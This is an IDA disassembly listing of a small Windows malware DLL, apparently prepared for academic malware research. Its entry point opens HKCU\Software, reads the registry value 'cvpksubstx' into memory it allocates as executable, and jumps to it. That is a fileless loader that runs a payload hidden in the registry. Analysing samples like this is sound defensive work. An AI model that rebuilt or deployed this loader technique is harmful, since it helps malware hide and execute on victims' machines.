;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	0D690B3819437050AEFD004556A38290
; Input	CRC32 :	90EEAB40

; File Name   :	C:\Users\farhadi\Desktop\509_Malware\0d690b3819437050aefd004556a38290
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	10000000
; Section 1. (virtual address 00001000)
; Virtual size			: 000000B8 (	184.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00000400
; Flags	60000020: Text Executable Readable
; Alignment	: default
; Exported entry   1. CreateProcessNotify

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 10001000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public CreateProcessNotify
CreateProcessNotify proc near		; DATA XREF: .rdata:off_100020F8o
		push	ebp
		mov	ebp, esp
		mov	eax, 1
		leave
		retn	8
CreateProcessNotify endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
		public DllEntryPoint
DllEntryPoint	proc near

hKey		= dword	ptr -18h
lpData		= dword	ptr -10h
cbData		= dword	ptr -8
hinstDLL	= dword	ptr  8
fdwReason	= dword	ptr  0Ch
lpReserved	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE8h
		cmp	[ebp+fdwReason], 1
		jnz	short loc_10001091
		pusha
		mov	eax, 0AD0Ch
		mov	[ebp+cbData], eax
		mov	eax, offset SubKey ; "Soft"
		mov	byte ptr [eax+4], 77h
		push	40h		; flProtect
		push	3000h		; flAllocationType
		push	[ebp+cbData]	; dwSize
		push	0		; lpAddress
		call	VirtualAlloc
		mov	ecx, eax
		mov	[ebp+lpData], ecx
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	0F003Fh		; samDesired
		push	0		; ulOptions
		push	offset SubKey	; "Soft"
		push	80000001h	; hKey
		call	RegOpenKeyExA
		push	eax
		call	GetTickCount
		pop	eax
		or	eax, eax
		jnz	short loc_1000108E
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		push	[ebp+lpData]	; lpData
		push	0		; lpType
		push	0		; lpReserved
		push	offset ValueName ; "cvpksubstx"
		push	[ebp+hKey]	; hKey
		call	RegQueryValueExA
		mov	esi, [ebp+lpData]
		mov	ecx, 1
		mov	eax, [ebp+hinstDLL]
		call	esi

loc_1000108E:				; CODE XREF: DllEntryPoint+57j
		popa
		jmp	short locret_1000109C
; ---------------------------------------------------------------------------

loc_10001091:				; CODE XREF: DllEntryPoint+Aj
		cmp	[ebp+fdwReason], 0
		jnz	short locret_1000109C
		mov	eax, 0

locret_1000109C:			; CODE XREF: DllEntryPoint+7Fj
					; DllEntryPoint+85j
		leave
		retn	0Ch
DllEntryPoint	endp

; [00000006 BYTES: COLLAPSED FUNCTION RegOpenKeyExA. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION RegQueryValueExA.	PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION GetTickCount. PRESS KEYPAD "+" TO	EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION VirtualAlloc. PRESS KEYPAD "+" TO	EXPAND]
		dd 52h dup(0)
		dd 380h	dup(?)
_text		ends

; Section 2. (virtual address 00002000)
; Virtual size			: 00000124 (	292.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00000600
; Flags	40000040: Data Readable
; Alignment	: default
;
; Imports from advapi32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; LSTATUS __stdcall RegQueryValueExA(HKEY hKey,	LPCSTR lpValueName, LPDWORD lpReserved,	LPDWORD	lpType,	LPBYTE lpData, LPDWORD lpcbData)
		extrn __imp_RegQueryValueExA:dword ; DATA XREF:	RegQueryValueExAr
					; .rdata:10002028o
; LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY	phkResult)
		extrn __imp_RegOpenKeyExA:dword	; DATA XREF: RegOpenKeyExAr

;
; Imports from kernel32.dll
;
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn __imp_VirtualAlloc:dword ; DATA XREF: VirtualAllocr
					; .rdata:1000203Co
; DWORD	__stdcall GetTickCount()
		extrn __imp_GetTickCount:dword ; DATA XREF: GetTickCountr


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 10002018h
__IMPORT_DESCRIPTOR_advapi32 dd	rva off_10002054 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aAdvapi32_dll	; DLL Name
		dd rva __imp_RegQueryValueExA ;	Import Address Table
__IMPORT_DESCRIPTOR_kernel32 dd	rva off_10002060 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva __imp_VirtualAlloc ; Import Address Table
		dd 5 dup(0)
;
; Import names for advapi32.dll
;
off_10002054	dd rva word_1000207C	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_advapi32o
		dd rva word_1000206C
		dd 0
;
; Import names for kernel32.dll
;
off_10002060	dd rva word_100020AE	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_kernel32o
		dd rva word_1000209E
		dd 0
word_1000206C	dw 1D0h			; DATA XREF: .rdata:10002058o
		db 'RegOpenKeyExA',0
word_1000207C	dw 1DAh			; DATA XREF: .rdata:off_10002054o
		db 'RegQueryValueExA',0
		align 10h
aAdvapi32_dll	db 'advapi32.dll',0     ; DATA XREF: .rdata:10002024o
		align 2
word_1000209E	dw 18Dh			; DATA XREF: .rdata:10002064o
		db 'GetTickCount',0
		align 2
word_100020AE	dw 2DDh			; DATA XREF: .rdata:off_10002060o
		db 'VirtualAlloc',0
		align 2
aKernel32_dll	db 'kernel32.dll',0     ; DATA XREF: .rdata:10002038o
		align 10h
;
; Export directory for
;
		dd 0			; Characteristics
		dd 4BF1513Eh		; TimeDateStamp: Mon May 17 10:22:54 2010
		dw 0			; MajorVersion
		dw 0			; MinorVersion
		dd rva word_10002102	; Name
		dd 1			; Base
		dd 1			; NumberOfFunctions
		dd 1			; NumberOfNames
		dd rva off_100020F8	; AddressOfFunctions
		dd rva off_100020FC	; AddressOfNames
		dd rva word_10002100	; AddressOfNameOrdinals
;
; Export Address Table for
;
off_100020F8	dd rva CreateProcessNotify ; DATA XREF:	.rdata:100020ECo
;
; Export Names Table for
;
off_100020FC	dd rva aCreateprocessn	; DATA XREF: .rdata:100020F0o
					; "CreateProcessNotify"
;
; Export Ordinals Table	for
;
word_10002100	dw 0			; DATA XREF: .rdata:100020F4o
word_10002102	dw 0			; DATA XREF: .rdata:100020DCo
		dd 0
		dd 2E6E0000h, 6C6C64h
aCreateprocessn	db 'CreateProcessNotify',0 ; DATA XREF: .rdata:off_100020FCo
		align 1000h
_rdata		ends

; Section 3. (virtual address 00003000)
; Virtual size			: 00000014 (	 20.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00000800
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 10003000h
; char SubKey[]
SubKey		db 'Soft',0             ; DATA XREF: DllEntryPoint+15o
					; DllEntryPoint+3Fo
		db 61h,	72h, 65h
		db 5Ch
; char ValueName[]
ValueName	db 'cvpksubstx',0       ; DATA XREF: DllEntryPoint+64o
		align 1000h
_data		ends


		end DllEntryPoint
